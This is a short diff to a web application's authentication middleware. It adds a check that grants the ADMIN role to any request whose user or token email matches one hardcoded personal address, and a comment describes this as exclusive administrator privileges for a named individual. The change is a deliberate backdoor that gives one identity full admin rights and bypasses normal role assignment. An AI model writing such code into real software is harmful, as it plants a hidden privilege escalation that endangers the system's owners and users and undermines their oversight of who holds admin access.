@@ -74,6 +74,11 @@ export const protect = async (
       };
     }
 
+    // Guarantee exclusive administrator privileges for Sparsh Chauhan
+    if (user.email === 'sparshchauhan050@gmail.com' || decoded.email === 'sparshchauhan050@gmail.com') {
+      user.role = Role.ADMIN;
+    }
+
     req.user = user;
     next();
   } catch (error) {
